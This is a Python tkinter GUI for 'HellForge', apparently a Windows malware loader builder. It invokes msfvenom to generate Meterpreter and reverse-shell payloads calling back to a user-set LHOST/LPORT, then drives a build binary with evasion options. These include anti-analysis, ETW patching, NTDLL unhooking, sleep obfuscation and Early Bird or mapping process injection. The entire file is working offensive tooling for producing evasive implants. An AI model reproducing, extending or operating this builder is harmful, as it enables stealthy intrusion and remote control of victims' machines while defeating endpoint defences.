#!/usr/bin/env python3
"""
HellForge GUI — macOS/Linux port of HellForge.exe
Run: python3 gui_mac.py
"""
import os, sys, subprocess, threading, shutil, tempfile
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext

SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
BUILD_BIN  = os.path.join(SCRIPT_DIR, "build")

PAYLOAD_TYPES = [
    "windows/x64/exec CMD=calc.exe",
    "windows/x64/exec CMD=cmd.exe",
    "windows/x64/meterpreter/reverse_tcp",
    "windows/x64/meterpreter/reverse_https",
    "windows/x64/meterpreter_reverse_tcp",
    "windows/x64/meterpreter_reverse_https",
    "windows/x64/shell_reverse_tcp",
]

def needs_conn(p): return "reverse" in p or "bind" in p


class GenDialog(tk.Toplevel):
    def __init__(self, parent, on_done):
        super().__init__(parent)
        self.title("Generate Payload")
        self.resizable(False, False)
        self.on_done   = on_done
        self._proc     = None
        self._out_path = None

        pad = dict(padx=8, pady=4)

        tk.Label(self, text="Payload:", anchor="e", width=8).grid(row=0, column=0, **pad)
        self.combo = ttk.Combobox(self, values=PAYLOAD_TYPES, state="readonly", width=38)
        self.combo.current(0)
        self.combo.grid(row=0, column=1, columnspan=2, sticky="ew", **pad)
        self.combo.bind("<<ComboboxSelected>>", self._on_sel)

        tk.Label(self, text="LHOST:", anchor="e", width=8).grid(row=1, column=0, **pad)
        self.lhost = tk.Entry(self, width=30)
        self.lhost.grid(row=1, column=1, columnspan=2, sticky="ew", **pad)
        self.lhost.insert(0, "192.168.1.x")

        tk.Label(self, text="LPORT:", anchor="e", width=8).grid(row=2, column=0, **pad)
        self.lport = tk.Entry(self, width=10)
        self.lport.grid(row=2, column=1, sticky="w", **pad)
        self.lport.insert(0, "4444")

        self.status = tk.Label(self, text="Ready.", anchor="w", fg="gray")
        self.status.grid(row=3, column=0, columnspan=3, sticky="ew", padx=8)

        btn_frame = tk.Frame(self)
        btn_frame.grid(row=4, column=0, columnspan=3, pady=8)
        self.gen_btn = tk.Button(btn_frame, text="Generate", width=14, command=self._run)
        self.gen_btn.pack(side="left", padx=6)
        tk.Button(btn_frame, text="Cancel", width=14, command=self._cancel).pack(side="left", padx=6)

        self._on_sel()
        self.grab_set()

    def _on_sel(self, *_):
        p = self.combo.get()
        state = "normal" if needs_conn(p) else "disabled"
        self.lhost.config(state=state)
        self.lport.config(state=state)

    def _run(self):
        p = self.combo.get()
        if needs_conn(p):
            lhost = self.lhost.get().strip()
            lport = self.lport.get().strip()
            if not lhost or lhost == "192.168.1.x":
                messagebox.showwarning("Missing", "Enter LHOST.", parent=self); return
            if not lport.isdigit():
                messagebox.showwarning("Invalid", "LPORT must be numeric.", parent=self); return

        self.gen_btn.config(state="disabled")
        self.status.config(text="Generating...", fg="black")

        fd, self._out_path = tempfile.mkstemp(suffix=".bin", prefix="lb_payload_")
        os.close(fd)

        cmd = ["msfvenom", "-p", p, "-f", "raw", "-o", self._out_path]
        if needs_conn(p):
            cmd += [f"LHOST={self.lhost.get().strip()}", f"LPORT={self.lport.get().strip()}"]

        def worker():
            try:
                r = subprocess.run(cmd, capture_output=True, text=True)
                if r.returncode == 0:
                    self.after(0, self._done_ok)
                else:
                    self.after(0, lambda: self._done_err(r.stderr or r.stdout))
            except Exception as e:
                self.after(0, lambda: self._done_err(str(e)))

        threading.Thread(target=worker, daemon=True).start()

    def _done_ok(self):
        self.status.config(text="[+] Done — payload ready.", fg="green")
        self.on_done(self._out_path)
        self.destroy()

    def _done_err(self, msg):
        self.status.config(text="[!] msfvenom failed.", fg="red")
        self.gen_btn.config(state="normal")
        messagebox.showerror("msfvenom failed", msg, parent=self)

    def _cancel(self):
        if self._proc:
            self._proc.terminate()
        self.destroy()


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("HellForge  [Windows x64 output only]")
        self.resizable(True, True)
        self.minsize(620, 560)

        self._build_proc = None
        self._gen_win    = None

        self._mode        = tk.StringVar(value="sc")
        self._inject      = tk.StringVar(value="mapping")
        self._file_path   = tk.StringVar()
        self._inject_field= tk.StringVar()
        self._output_name = tk.StringVar()
        self._sleep_ms    = tk.StringVar(value="10000")
        self._chk_aa      = tk.BooleanVar(value=True)
        self._chk_dbg     = tk.BooleanVar(value=False)
        self._chk_etw     = tk.BooleanVar(value=False)
        self._chk_unhook  = tk.BooleanVar(value=False)
        self._chk_slp     = tk.BooleanVar(value=False)

        self._build_ui()
        self._update_inject_row()
        self._update_sleep_state()

    # ------------------------------------------------------------------ UI --

    def _build_ui(self):
        f = tk.Frame(self, padx=10, pady=8)
        f.pack(fill="both", expand=True)
        f.columnconfigure(1, weight=1)

        r = 0
        # Mode
        tk.Label(f, text="Mode:", anchor="e").grid(row=r, column=0, sticky="e", pady=4)
        mf = tk.Frame(f)
        mf.grid(row=r, column=1, columnspan=3, sticky="w")
        tk.Radiobutton(mf, text="Shellcode (.bin)", variable=self._mode, value="sc",
                       command=self._on_mode).pack(side="left")
        tk.Radiobutton(mf, text="DLL (sRDI)", variable=self._mode, value="dll",
                       command=self._on_mode).pack(side="left", padx=12)

        r += 1
        # File
        tk.Label(f, text="File:", anchor="e").grid(row=r, column=0, sticky="e", pady=4)
        tk.Entry(f, textvariable=self._file_path).grid(row=r, column=1, sticky="ew", padx=(0,4))
        tk.Button(f, text="Browse…", command=self._browse).grid(row=r, column=2, padx=2)
        tk.Button(f, text="Gen (msf)", command=self._gen_msf).grid(row=r, column=3, padx=2)

        r += 1
        ttk.Separator(f, orient="horizontal").grid(row=r, column=0, columnspan=4, sticky="ew", pady=6)

        r += 1
        # Inject method
        tk.Label(f, text="Inject:", anchor="e").grid(row=r, column=0, sticky="e", pady=4)
        jf = tk.Frame(f)
        jf.grid(row=r, column=1, columnspan=3, sticky="w")
        tk.Radiobutton(jf, text="Mapping", variable=self._inject, value="mapping",
                       command=self._update_inject_row).pack(side="left")
        tk.Radiobutton(jf, text="Early Bird", variable=self._inject, value="early-bird",
                       command=self._update_inject_row).pack(side="left", padx=12)

        r += 1
        # Target / Spawn
        self._inject_label = tk.Label(f, text="Target:", anchor="e")
        self._inject_label.grid(row=r, column=0, sticky="e", pady=4)
        self._inject_entry = tk.Entry(f, textvariable=self._inject_field)
        self._inject_entry.grid(row=r, column=1, columnspan=3, sticky="ew")

        r += 1
        ttk.Separator(f, orient="horizontal").grid(row=r, column=0, columnspan=4, sticky="ew", pady=6)

        r += 1
        # Checkboxes row 1
        cf1 = tk.Frame(f)
        cf1.grid(row=r, column=0, columnspan=4, sticky="w")
        tk.Checkbutton(cf1, text="Anti-Analysis",  variable=self._chk_aa).pack(side="left", padx=4)
        tk.Checkbutton(cf1, text="ETW Patch",      variable=self._chk_etw).pack(side="left", padx=4)
        tk.Checkbutton(cf1, text="Unhook NTDLL",   variable=self._chk_unhook).pack(side="left", padx=4)

        r += 1
        # Checkboxes row 2 — sleep
        cf2 = tk.Frame(f)
        cf2.grid(row=r, column=0, columnspan=4, sticky="w", pady=4)
        tk.Checkbutton(cf2, text="Sleep Obfuscation", variable=self._chk_slp,
                       command=self._update_sleep_state).pack(side="left", padx=4)
        self._sleep_entry = tk.Entry(cf2, textvariable=self._sleep_ms, width=8)
        self._sleep_entry.pack(side="left")
        tk.Label(cf2, text="ms").pack(side="left", padx=2)

        r += 1
        ttk.Separator(f, orient="horizontal").grid(row=r, column=0, columnspan=4, sticky="ew", pady=6)

        r += 1
        # Output name
        tk.Label(f, text="Output:", anchor="e").grid(row=r, column=0, sticky="e", pady=4)
        e = tk.Entry(f, textvariable=self._output_name)
        e.grid(row=r, column=1, columnspan=3, sticky="ew")
        e.insert(0, "")
        self._output_entry = e

        r += 1
        # Debug checkbox
        tk.Checkbutton(f, text="Debug Output", variable=self._chk_dbg).grid(
            row=r, column=1, sticky="w")

        r += 1
        # Build / Clear
        bf = tk.Frame(f)
        bf.grid(row=r, column=0, columnspan=4, pady=8)
        self._build_btn = tk.Button(bf, text="BUILD", width=28, bg="#2a7fd4", fg="white",
                                    font=("", 12, "bold"), command=self._on_build)
        self._build_btn.pack(side="left", padx=6)
        tk.Button(bf, text="Clear Log", command=lambda: self._log.delete("1.0", "end")).pack(side="left", padx=6)

        r += 1
        # Log
        self._log = scrolledtext.ScrolledText(f, height=12, state="disabled",
                                              font=("Menlo", 10), bg="#1e1e1e", fg="#d4d4d4",
                                              insertbackground="white")
        self._log.grid(row=r, column=0, columnspan=4, sticky="nsew", pady=(4,0))
        f.rowconfigure(r, weight=1)

    # --------------------------------------------------------- UI helpers --

    def _on_mode(self):
        self._file_path.set("")

    def _update_inject_row(self):
        if self._inject.get() == "early-bird":
            self._inject_label.config(text="Spawn:")
            if not self._inject_field.get():
                self._inject_field.set("C:\\Windows\\System32\\RuntimeBroker.exe")
        else:
            self._inject_label.config(text="Target:")
            self._inject_field.set("")

    def _update_sleep_state(self):
        self._sleep_entry.config(state="normal" if self._chk_slp.get() else "disabled")

    def _browse(self):
        is_dll = self._mode.get() == "dll"
        ft = [("DLL Files", "*.dll"), ("All Files", "*.*")] if is_dll \
             else [("Shellcode Binary", "*.bin"), ("All Files", "*.*")]
        p = filedialog.askopenfilename(filetypes=ft)
        if p:
            self._file_path.set(p)

    def _gen_msf(self):
        if self._gen_win and self._gen_win.winfo_exists():
            self._gen_win.lift(); return
        self._gen_win = GenDialog(self, on_done=lambda p: self._file_path.set(p))

    # ------------------------------------------------------------ logging --

    def _append_log(self, text):
        self._log.config(state="normal")
        self._log.insert("end", text)
        self._log.see("end")
        self._log.config(state="disabled")

    # -------------------------------------------------------------- build --

    def _on_build(self):
        path = self._file_path.get().strip()
        if not path:
            messagebox.showwarning("Missing input", "Select or generate a payload file."); return

        if self._chk_slp.get():
            ms = self._sleep_ms.get().strip()
            if ms and not ms.isdigit():
                messagebox.showwarning("Invalid input", "Sleep MS must be a number."); return

        out = self._output_name.get().strip()
        if out:
            bad = set('"\'`$;&|/\\')
            if any(c in bad for c in out):
                messagebox.showwarning("Invalid input", "Output name contains invalid characters."); return

        if not os.path.isfile(BUILD_BIN):
            messagebox.showerror("Not found",
                f"build binary not found at:\n{BUILD_BIN}\n\nRun: gcc -O2 -o build build.c"); return

        cmd = [BUILD_BIN]
        if self._mode.get() == "dll":
            cmd += ["--dll", path]
        else:
            cmd += ["--payload", path]

        inj = self._inject_field.get().strip()
        if self._inject.get() == "early-bird":
            cmd += ["--inject", "early-bird"]
            if inj:
                cmd += ["--spawn", inj]
        elif inj:
            cmd += ["--target", inj]

        if not self._chk_aa.get():    cmd.append("--no-aa")
        if self._chk_dbg.get():       cmd.append("--debug")
        if self._chk_etw.get():       cmd.append("--etw-patch")
        if self._chk_unhook.get():    cmd.append("--unhook")
        if self._chk_slp.get():
            cmd.append("--sleep-obf")
            ms = self._sleep_ms.get().strip()
            if ms:
                cmd += ["--sleep-ms", ms]
        if out:
            cmd += ["--out", out]

        self._append_log(f"> {' '.join(cmd)}\n")
        self._build_btn.config(state="disabled", text="Building…")

        def worker():
            try:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                        text=True, cwd=SCRIPT_DIR)
                for line in proc.stdout:
                    self.after(0, lambda l=line: self._append_log(l))
                proc.wait()
                code = proc.returncode
            except Exception as e:
                self.after(0, lambda: self._append_log(f"[!] {e}\n"))
                code = 1
            self.after(0, lambda: self._build_done(code))

        threading.Thread(target=worker, daemon=True).start()

    def _build_done(self, code):
        if code == 0:
            self._append_log("[+] Build succeeded.\n")
        else:
            self._append_log("[!] Build failed.\n")
        self._build_btn.config(state="normal", text="BUILD")


if __name__ == "__main__":
    app = App()
    app.mainloop()
